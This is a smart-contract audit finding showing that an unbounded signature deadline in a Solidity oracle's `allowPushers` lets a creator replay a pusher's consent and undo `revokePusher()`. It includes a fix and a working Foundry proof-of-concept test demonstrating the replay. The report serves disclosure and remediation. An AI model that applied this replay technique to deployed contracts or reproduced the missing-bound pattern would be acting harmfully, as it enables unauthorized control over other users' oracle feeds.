### Title
Unbounded `deadline` in `allowPushers` Renders `revokePusher()` Permanently Ineffective — (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` accepts an unbounded `deadline` (no upper cap). A creator who holds a pusher's consent signature over `deadline = type(uint256).max` can call `allowPushers` again immediately after the pusher calls `revokePusher()`, re-establishing the delegation. The pusher can never permanently exit the creator's namespace, breaking the core revocation invariant the code itself documents as the deadline's purpose.

---

### Finding Description

`_ensureDeadline` in `OracleBase` only enforces a lower bound:

```solidity
// OracleBase.sol L124-126
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
```

There is no upper bound. The `allowPushers` function passes the caller-supplied `deadline` directly into the EIP-191 hash and into this check:

```solidity
// CompressedOracle.sol L192-211
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;
```

The code's own NatSpec explicitly states the deadline's purpose:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

But because there is no cap on `deadline`, a consent signed with `deadline = type(uint256).max` is functionally undated — it can be replayed by the creator forever.

`revokePusher` clears the mapping:

```solidity
// CompressedOracle.sol L238-243
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
```

But the creator can immediately call `allowPushers` again with the same signature, writing `namespaceRemapping[pusher] = creator` again. The pusher's revocation is undone in the same block.

---

### Impact Explanation

After revocation is bypassed, every subsequent `fallback()` push from the pusher's address resolves `namespaceRemapping[msg.sender]` to the creator's address and writes into the **creator's namespace**, not the pusher's own:

```solidity
// CompressedOracle.sol L315-316
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
```

This produces two concrete bad-price outcomes:

1. **Pusher's own feeds go stale.** Any pool or price provider reading `feedIdOf(pusher, slotIndex, positionIndex)` receives `timestampMs = 0` (never-pushed), which every consumer rejects as stale. Pools anchored to the pusher's own namespace halt quoting.

2. **Creator's namespace receives unauthorized writes.** If the pusher continues pushing (unaware of the re-delegation), the creator's feeds are updated with the pusher's data, potentially feeding incorrect bid/ask prices into pools that consume the creator's feeds.

Both outcomes satisfy the "bad-price execution: stale … quote reaches a pool swap" impact gate.

---

### Likelihood Explanation

The trigger requires the pusher to have signed a consent with a far-future deadline. There is no contract-enforced cap preventing this. A creator can request such a signature during initial onboarding (e.g., "sign once, push forever"). Once the pusher signs `deadline = type(uint256).max`, the creator holds a permanent re-delegation capability. The pusher has no on-chain recourse: `revokePusher()` is immediately reversible by the creator. The trigger is a valid semi-trusted actor (creator) exploiting a missing bound — not a privileged admin action.

---

### Recommendation

Enforce a maximum deadline window in `_ensureDeadline` or in `allowPushers` itself:

```solidity
uint256 public constant MAX_DELEGATION_WINDOW = 30 days;

function allowPushers(uint256 deadline, ...) external {
    _ensureDeadline(deadline);
    require(deadline <= block.timestamp + MAX_DELEGATION_WINDOW, DeadlineTooFar());
    ...
}
```

This ensures that any consent signature expires within a bounded window, so `revokePusher()` followed by waiting out the window permanently terminates the delegation.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract UnboundedDeadlinePoc is Test {
    CompressedOracleV1 oracle;
    uint256 constant CREATOR_KEY = 0xC0FFEE01;
    uint256 constant PUSHER_KEY  = 0xDEAD0001;
    address creator;
    address pusher;

    function setUp() public {
        oracle  = new CompressedOracleV1(address(this), 0);
        creator = vm.addr(CREATOR_KEY);
        pusher  = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevocationBypassedViaUnboundedDeadline() public {
        // 1. Pusher signs consent with deadline = type(uint256).max
        uint256 deadline = type(uint256).max;
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegated");

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator immediately re-establishes using the SAME signature
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // succeeds — deadline never expires
        assertEq(oracle.namespaceRemapping(pusher), creator, "re-delegated: revocation bypassed");
    }
}
